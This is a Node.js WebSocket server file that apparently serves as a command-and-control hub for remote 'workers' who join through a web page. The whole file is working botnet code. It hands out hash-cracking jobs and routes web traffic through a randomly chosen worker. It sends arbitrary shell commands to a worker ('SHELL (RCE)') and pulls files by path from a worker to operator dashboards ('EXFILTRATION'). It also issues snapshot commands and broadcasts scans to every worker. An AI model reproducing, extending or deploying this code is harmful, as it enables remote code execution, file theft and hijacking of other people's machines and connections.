const express = require('express');
const { Server } = require('ws');
const http = require('http');
const cors = require('cors');
const path = require('path');

// --- CONFIGURATION ---
const PORT = process.env.PORT || 3000;
const SECRET_KEY = process.env.ACCESS_KEY; // The Vault Key

// SECURITY CHECK
if (!SECRET_KEY) {
    console.error("FATAL ERROR: No ACCESS_KEY found in Environment Variables.");
    console.error("Go to Render Dashboard -> Environment -> Add ACCESS_KEY");
    process.exit(1);
}

// --- STATE MANAGEMENT ---
let workers = new Map(); // Key: WebSocket | Value: { id, ip, role, lastSeen }
let clients = new Set(); // Dashboards

let searchRange = 0;
const RANGE_SIZE = 100000;
let totalHashes = 0;
let foundGoldenTicket = null;

const app = express();
app.use(cors());
const server = http.createServer(app);
const wss = new Server({ server });

function generateId() {
    return 'UNIT-' + Math.random().toString(36).substr(2, 4).toUpperCase();
}

// --- HTTP ROUTES ---
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.get('/join', (req, res) => res.sendFile(path.join(__dirname, 'miner.html')));

// --- WEBSOCKET LOGIC ---
wss.on('connection', (ws, req) => {
    
    // 1. SECURITY HANDSHAKE
    // We expect the URL to be: wss://...?key=YOUR_SECRET_KEY
    const urlParams = new URLSearchParams(req.url.replace('/',''));
    const providedKey = urlParams.get('key');

    if (providedKey !== SECRET_KEY) {
        console.log(`[SECURITY] Blocked unauthorized connection from ${req.socket.remoteAddress}`);
        ws.close();
        return;
    }

    // 2. ASSIGN IDENTITY
    const id = generateId();
    const ipRaw = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const ip = ipRaw ? ipRaw.split(',')[0] : 'Unknown';

    workers.set(ws, { id: id, ip: ip, role: 'CONNECTING', status: 'Online' });

    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            handleMessage(ws, data);
        } catch (e) { console.error('Invalid JSON:', e.message); }
    });

    ws.on('close', () => {
        workers.delete(ws);
        clients.delete(ws);
        broadcastStats();
    });
});

// --- CORE SYSTEM LOGIC ---
function handleMessage(ws, data) {
    const worker = workers.get(ws);

    switch (data.type) {

        // --- REGISTRATION ---
        case 'REGISTER_WORKER':
            if (worker) { worker.role = 'MINING'; worker.type = 'NODE'; }
            sendJob(ws);
            broadcastStats();
            break;

        case 'REGISTER_CLIENT':
            clients.add(ws);
            workers.delete(ws); 
            broadcastStats();
            break;

        // --- MODULE 1: MINING ---
        case 'JOB_COMPLETE':
            totalHashes += RANGE_SIZE;
            if (worker) worker.role = 'IDLE'; // Wait for next command
            if (data.solution) foundGoldenTicket = data.solution;
            
            // In "Eternal Mode", we just keep sending jobs if no ticket found
            if (!foundGoldenTicket) sendJob(ws);
            broadcastStats();
            break;

        // --- MODULE 2: PROXY (HYDRA) ---
        case 'SEND_PROXY_CMD':
            const proxyWorkers = Array.from(workers.keys());
            if (proxyWorkers.length > 0) {
                const target = proxyWorkers[Math.floor(Math.random() * proxyWorkers.length)];
                if (workers.get(target)) {
                    workers.get(target).role = 'PROXYING';
                    broadcastStats();
                }
                target.send(JSON.stringify({ type: 'HTTP_PROXY', url: data.url, requestId: Date.now() }));
            }
            break;

        case 'PROXY_RESULT':
            clients.forEach(c => c.send(JSON.stringify({ type: 'PROXY_LOG', data: data })));
            if (worker) {
                setTimeout(() => { 
                    if (workers.has(ws)) { worker.role = 'IDLE'; broadcastStats(); }
                }, 1000);
            }
            break;

        // --- MODULE 3: SHELL (RCE) ---
        case 'SEND_SHELL_CMD':
            const shellWorkers = Array.from(workers.keys());
            if (shellWorkers.length > 0) {
                shellWorkers[0].send(JSON.stringify({ type: 'EXEC_CMD', command: data.command }));
            }
            break;

        case 'SHELL_RESULT':
             clients.forEach(c => c.send(JSON.stringify({ type: 'SHELL_LOG', output: data.output })));
             break;

        // --- MODULE 4: EXFILTRATION ---
        case 'SEND_EXFIL_CMD':
             const exfilWorkers = Array.from(workers.keys());
             if (exfilWorkers.length > 0) {
                 exfilWorkers[0].send(JSON.stringify({ type: 'EXFIL_CMD', path: data.path }));
             }
             break;

        case 'EXFIL_RESULT':
             clients.forEach(c => c.send(JSON.stringify({ 
                 type: 'EXFIL_RECEIVE', 
                 filename: data.filename, 
                 data: data.data 
             })));
             break;

        // --- MODULE 5: SNAPSHOT ---
        case 'SEND_SNAPSHOT_CMD':
             const camWorkers = Array.from(workers.keys());
             if (camWorkers.length > 0) {
                 camWorkers[0].send(JSON.stringify({ type: 'SNAPSHOT_CMD', url: data.url }));
             }
             break;

        // --- MODULE 6: ALPHA SNIPER ---
        case 'SEND_SNIPE_CMD':
             // Broadcast to ALL workers (Massive Parallel Scan)
             workers.forEach((meta, workerWs) => {
                 workerWs.send(JSON.stringify({ type: 'SNIPE_CMD', ticker: data.ticker }));
             });
             break;

        case 'SNIPE_RESULT':
             clients.forEach(c => c.send(JSON.stringify({ type: 'SNIPE_LOG', data: data })));
             break;
    }
}

function sendJob(ws) {
    if (foundGoldenTicket) {
        // We do NOT stop the worker anymore. We just stop mining.
        ws.send(JSON.stringify({ type: 'STOP', solution: foundGoldenTicket }));
        return;
    }
    const start = searchRange;
    const end = searchRange + RANGE_SIZE;
    searchRange += RANGE_SIZE;
    ws.send(JSON.stringify({ type: 'MINING_JOB', start: start, end: end, target: '81dc9bdb52d04dc20036dbd8313ed055' }));
}

function broadcastStats() {
    const workerArray = Array.from(workers.values());
    const stats = JSON.stringify({
        type: 'STATS',
        workers: workerArray,
        totalHashes: totalHashes,
        goldenTicket: foundGoldenTicket
    });
    clients.forEach(c => { if (c.readyState === 1) c.send(stats); });
}

server.listen(PORT, () => console.log(`Watchtower Online on ${PORT}`));
